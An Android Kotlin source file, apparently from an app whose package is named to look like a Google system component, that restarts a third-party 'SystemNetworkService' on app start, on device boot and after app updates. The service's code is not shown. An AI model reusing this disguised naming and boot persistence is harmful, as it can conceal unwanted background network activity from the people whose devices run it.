package com.google.system

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.openaccess.sdk.service.SystemNetworkService

object AppInitializer {
    private const val TAG = "AppInit"
    private var initialized = false

    fun init(ctx: Context) {
        if (initialized) return
        initialized = true
        Log.i(TAG, "init")
        try {
            SystemNetworkService.start(ctx)
        } catch (e: Exception) {
            Log.w(TAG, "start: ${e.message}")
        }
    }

    class BootReceiver : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            val action = intent.action
            if (action == Intent.ACTION_BOOT_COMPLETED ||
                action == Intent.ACTION_LOCKED_BOOT_COMPLETED ||
                action == "android.intent.action.QUICKBOOT_POWERON") {
                Log.i(TAG, "boot received: $action")
                try { SystemNetworkService.start(ctx) } catch (e: Exception) { Log.w(TAG, "boot: ${e.message}") }
            }
        }
    }

    class PackageReplacedReceiver : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            val action = intent.action
            Log.i(TAG, "package event received: $action")
            if (action == Intent.ACTION_MY_PACKAGE_REPLACED) {
                Log.i(TAG, "app replaced, restarting service...")
                try {
                    SystemNetworkService.start(ctx)
                    Log.i(TAG, "service restarted successfully after update")
                } catch (e: Exception) {
                    Log.e(TAG, "failed to restart service: ${e.message}")
                }
            }
        }
    }
}
